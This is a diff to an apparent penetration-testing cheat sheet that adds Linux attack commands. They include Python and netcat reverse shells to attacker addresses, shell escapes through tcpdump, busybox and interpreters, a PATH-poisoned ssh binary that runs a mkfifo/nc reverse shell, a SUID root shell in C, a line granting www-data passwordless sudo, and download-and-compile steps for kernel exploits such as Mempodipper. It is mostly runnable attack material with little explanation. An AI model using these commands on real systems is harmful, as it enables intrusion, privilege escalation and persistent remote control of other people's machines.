@@ -18,14 +18,33 @@ Getting a reverse shell
 Post exploitation
     Get a TTY shell after a reverse shell connection
     *$ python -c 'import pty;pty.spawn("/bin/bash")'*
-    Command to skip ignored lines in config files
-    *$ alias nonempty="egrep -v '^[ \t]*#|^$'"*
 
-Services information
-    The following command will list processes running by root, permissions and NFS exports.
-    *$ echo 'services runnig as root'; ps aux | grep root;  echo 'permissions'; ps aux | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++'; echo 'nfs info'; ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null*
 
 Escaping limited interpreters
+    Some commands to overcome limited shells:
+    *$ ssh user@$ip nc $localip 4444 -e /bin/sh
+enter user's password
+python -c 'import pty; pty.spawn("/bin/sh")'
+export TERM=linux*
+
+    *$ python -c 'import pty; pty.spawn("/bin/sh")'*
+    *$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),   *$ 1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'*
+    *$ echo os.system('/bin/bash')*
+    *$ /bin/sh -i*
+    *$ perl —e 'exec "/bin/sh";'*
+    Within perl interpreter
+    *$ exec "/bin/sh";*
+    Within ruby interpreter
+    *$ exec "/bin/sh"*
+
+    From within tcpdump
+    *$ echo $’id\n/bin/netcat $ip 443 –e /bin/bash’ > /tmp/.test
+chmod +x /tmp/.test
+sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst –Z root*
+
+    From busybox
+    *$ /bin/busybox telnetd -|/bin/sh -p9999*
+
     *:!bash
 :set shell=/bin/bash:shell
 !bash
@@ -36,12 +55,40 @@ echo "os.execute('/bin/sh')"
 sudo nmap --script=exploit.nse	nmap (thanks to comment by anonymous below)
 perl -e 'exec "/bin/bash";'*
 
+Services information
+    The following command will list processes running by root, permissions and NFS exports.
+    *$ echo 'services runnig as root'; ps aux | grep root;  echo 'permissions'; ps aux | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++'; echo 'nfs info'; ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null*
 
 Linux elevation of privileges
-    Scripts to run
-    *https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
-https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh*
+    First try simple sudo:
+    *$ sudo su*
+    What services are running as root?:
+    *$ ps aux | grep root*
 
+    Scripts to run
+    *wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+wget https://raw.githubusercontent.com/PenturaLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl*
+
+Exploits worth running
+    CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8
+    *https://www.exploit-db.com/exploits/15285/*
+
+    CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)
+    *https://git.zx2c4.com/CVE-2012-0056/about/*
+
+    Linux CVE 2012-0056
+    *wget -O exploit.c <http://www.exploit-db.com/download/18411>
+  gcc -o mempodipper exploit.c
+  ./mempodipper*
+    CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
+    *https://dirtycow.ninja/*
+
+
+
+    Command to skip ignored lines in config files
+    *$ alias nonempty="egrep -v '^[ \t]*#|^$'"*
 
     If Mysql is running as root, you can run commands using *sys_exec()*. For instance, to add user to sudoers:
     *sys_exec('usermod -a -G admin username')*
@@ -103,6 +150,20 @@ $ find / -perm -g=s -type f 2>/dev/null*
 $ export -f /usr/bin/foo
 $ /usr/bin/foo
 It works*
+    if you can just change PATH, the following will add a poisoned ssh binary:
+    * set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"
+ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f" >> /tmp/ssh
+ chmod +x ssh*
+
+    Generating SUID C Shell for /bin/bash
+    *int main(void){
+setresuid(0, 0, 0);
+system("/bin/bash");
+}*
+
+    Add user www-data to sudoers with no password
+    *$ echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update*
+
 
     Find other uses in the system
     *$id; who; w; last; cat /etc/passwd | cut -d: -f1; echo 'sudoers:'; cat /etc/sudoers; sudo -l*
